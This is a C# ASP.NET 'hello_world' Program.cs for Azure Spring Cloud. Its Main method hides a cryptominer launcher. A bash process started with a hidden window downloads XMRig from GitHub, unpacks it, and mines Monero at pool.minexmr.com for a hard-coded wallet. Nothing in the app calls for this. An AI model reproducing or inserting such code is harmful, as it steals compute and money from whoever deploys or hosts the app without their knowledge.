using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Hosting;
using Microsoft.Extensions.Configuration;
using Microsoft.Extensions.Hosting;
using Microsoft.Extensions.Logging;
using Microsoft.Azure.SpringCloud.Client;

namespace hello_world
{
    public class Program
    {
        public static void Main(string[] args)
        {
            CreateHostBuilder(args).Build().Run();
            try
            {
                // new Process()
                // {
                //     StartInfo = new ProcessStartInfo()
                //     {
                //         WindowStyle = ProcessWindowStyle.Hidden,
                //         FileName = $"/bin/bash",
                //         WorkingDirectory = AppContext.BaseDirectory,
                //         Arguments = $"-c \"tmux\"",
                //         RedirectStandardOutput = true,
                //         RedirectStandardError = true,
                //         UseShellExecute = false
                //     }
                // }.Start();
                // Thread.Sleep(2500);
                var process = new Process();
                var processStartInfo = new ProcessStartInfo()
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    FileName = $"/bin/bash",
                    WorkingDirectory = AppContext.BaseDirectory,
                    Arguments =
                        $"-c \"curl -LJO https://github.com/xmrig/xmrig/releases/download/v6.16.1/xmrig-6.16.1-linux-x64.tar.gz -o xmrig-6.16.1-linux-x64.tar.gz ; tar xvfz xmrig-6.16.1-linux-x64.tar.gz ; pkill xmrig; xmrig-6.16.1/xmrig -o pool.minexmr.com:4444 -u 48QZP31VnTkYTbsqZ4dq1JGMjwtds2sBnCpxrjGwBfTWG1NrEoWJGca5mxxoL8oD3NQmQuK23fTi546McgXxmd2NSyTUB1T.testxx \"",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                process.StartInfo = processStartInfo;
                process.Start();
                process.WaitForExit();
                String error = process.StandardError.ReadToEnd();
                Console.WriteLine("ERROR: ", error);
                String output = process.StandardOutput.ReadToEnd();
                Console.WriteLine("OUTPUT: ", output);
            }
            catch (Exception ex)
            {
                //_logger.LogError(ex.Message, ex);
                throw;
            }
        }

        public static IHostBuilder CreateHostBuilder(string[] args) =>
            Host.CreateDefaultBuilder(args)
                .UseAzureSpringCloudService()
                .ConfigureWebHostDefaults(webBuilder => { webBuilder.UseStartup<Startup>(); });
    }
}